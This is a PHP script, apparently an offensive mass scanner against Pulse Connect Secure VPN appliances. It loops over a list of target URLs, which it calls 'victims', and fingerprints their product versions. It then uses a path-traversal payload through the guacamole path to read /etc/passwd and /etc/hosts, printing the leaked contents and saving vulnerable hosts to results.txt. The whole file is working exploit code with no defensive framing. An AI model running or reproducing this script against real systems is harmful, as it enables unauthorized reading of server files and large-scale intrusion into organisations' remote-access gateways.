<?php

system('clear');
require "test.php";

$list = file_get_contents("list.txt");
$urls     = explode("\n", $list);
$count    = count($urls);

$passwd = "dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/";
$hosts = "dana-na/../dana/html5acc/guacamole/../../../../../../../etc/hosts?/dana/html5acc/guacamole/";
$path = "dana-na/nc/nc_gina_ver.txt";

function rce($url){
     $data = curl_init();
     curl_setopt($data, CURLOPT_RETURNTRANSFER, 1);
     curl_setopt($data, CURLOPT_URL, $url);
//      curl_setopt($data, CURLOPT_TIMEOUT, 30);
     curl_setopt($data, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0");
     $output = curl_exec($data);
     curl_close($data);
     return $output;
}

print "\033[96m[+] Victim $count Urls.\033[97m\n";

foreach ($urls as $list) {
    $shell = explode(PHP_EOL, $list);
    foreach ($shell as $shellchk) {
    $url  = trim($shellchk);

$product = rce($url.$path);
      echo "\nVictim : \033[96m$url\033[97m\n";
//       print_r($product);
preg_match_all('<PARAM NAME="ProductVersion" VALUE="(.*?)">', $product, $versi);
      
if(preg_match("/ProductVersion/", $product)){
  echo "[+] Pulse Connect Secure \033[92m";
  print_r($versi[1][0]);
  echo "\033[97m\n";  
}
  else{
    echo "[+] Pulse Connect Secure \033[91mBad\033[97m\n";
  }
      
$leadpasswd = rce($url.$passwd);
$leadhosts = rce($url.$hosts);
      
if(preg_match("/root:x:0:0:root/", $leadpasswd)){
  echo "[+] Arbitrary File Read \033[92mVuln\033[97m\n\n";
  $save = @fopen("results.txt", "a");
  fwrite($save, $url."\n");
  fclose($save);
  echo "\033[92m[+] Lead etc/passwd\033[97m\n";
  print_r($leadpasswd);
  echo "\n";
  
  echo "\033[92m[+] Lead hosts\033[97m\n";
  print_r($leadhosts);
  echo "\n";
}
      
  else{
    echo "[+] Arbitrary File Read \033[91mBad\033[97m\n";
  }

 }
}

print "\n\033[96mVulnerabilty victim save as to results.txt\033[97m\n";
?>
